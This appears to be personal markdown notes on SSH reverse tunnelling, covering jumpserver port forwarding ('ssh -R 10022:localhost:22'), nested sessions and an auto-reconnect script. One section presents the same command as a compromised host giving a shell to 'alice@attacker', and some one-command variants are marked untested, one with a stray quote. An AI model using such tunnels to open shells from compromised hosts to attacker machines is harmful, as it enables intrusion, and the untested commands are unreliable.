# SSh tunneling and reverse shells
Setting up a host to provide a shell without having an external IP address with a listening port.






## Jumpserver  (ssh + sshd)
Intermediate publically-routable server with sshd listening on public IP:PORT.


### Example of using a jumpserver
Involved user accounts:
* `alice@robo-devel` - Machine to grant bob access to.
* `bob@robo-devel` - Machine to grant bob access to.
* `alice@jump` - Alices account on jumpserver.
* `bob@jump` - Bobs account on jumpserver.
* `bob@bob-pad` - Needs remote access to `robo-devel`

Assuming all authentication is properly configured (respective pubkeys present in appropriate `authorized_keys` files on the involved hosts)
* TODO: Step-by-step exact details on doing this; for newbies.

Tunnel established by `alice@robo-devel` to `ssh://alice@jump` forwarding through `jump`

To establish tunnel: (as `alice@robo-devel` i.e. on targets host)
```bash
ssh -R 10022:localhost:22 alice@jump
```
* TODO: Better understand and explain nuances of invocation - e.g. can all params take `ssh://user@host:port/path` style addresses?


TESTME
```bash
## $ ssh -q -W someuser@dest.example.com:10022 someuser@jump.example.com -p 22
ssh -q -W 'someuser@dest.example.com:10022' 'ssh://alice@jump:22'
```

* <https://stackoverflow.com/questions/11793019/how-to-provide-reverse-ssh-to-a-shell>

#### Jumpserver tunnel via script
The same base method as previous, but using a script instead of directly remembering and typing commands.

See file: ["maintain-ssh-tunnel.jumpserver-reverse-shell.sh"](/examples/ssh/maintain-ssh-tunnel.jumpserver-reverse-shell.sh) providing example of infinite loop to auto-reconnect by rerunning ssh command.
You will need to modify the parameters used inside the script to suit your usernames, addresses and ports.


Establishing portforwarding:
```bash
alice@robo-devel:~$ ./maintain-ssh-tunnel.jumpserver-reverse-shell.sh
```

Nested SSH sessions to connect to target:
```bash
bob@bob-pad:~$ ssh ssh://bob@jump
bob@jump:~$ ssh ssh://bob@localhost:10022
bob@robo-devel:~$
```

Connecting to target in one command: (TESTME)
```bash
bob@bob-pad:~$ ssh -q -W 'ssh://bob@localhost:10022' 'ssh://alice@jump:22
```

----------


## Direct tunnel from target (ssh + sshd)
No jumpserver involved, e.g. target host is behind NAT and the other has a publically routable IP.

(Like classic pentest demos, where compromised host directly connects to attacker controlled machine providing a shell to the attacker.)



To establish tunnel: (as `alice@target` i.e. on targets host)
```bash
ssh -R 10022:localhost:22 alice@attacker
```


## Other reverse shell stuff
(Things like netcat and whatnot; break into your printer or the home-automation raspberry pi you setup in your spider-infested crawlspace.)
(Reminder: Don't break the law, kthx.)
* TODO: Add links, notes, examples, advice, guides, etc.



## Links
### SSH
* <https://www.man7.org/linux/man-pages/man1/ssh.1.html>
* <https://stackoverflow.com/questions/11793019/how-to-provide-reverse-ssh-to-a-shell>

Specifications and formats:
* ["OpenSSH Specifications"](https://www.openssh.com/specs.html)
* SSH URI format ["Uniform Resource Identifier (URI) Scheme for Secure Shell (SSH)"](https://www.ietf.org/archive/id/draft-salowey-secsh-uri-00.html)
* ["Uniform Resource Identifier (URI) Scheme for Secure File Transfer Protocol (SFTP) and Secure Shell (SSH)"](https://datatracker.ietf.org/doc/html/draft-ietf-secsh-scp-sftp-ssh-uri-04)

## Unsorted links
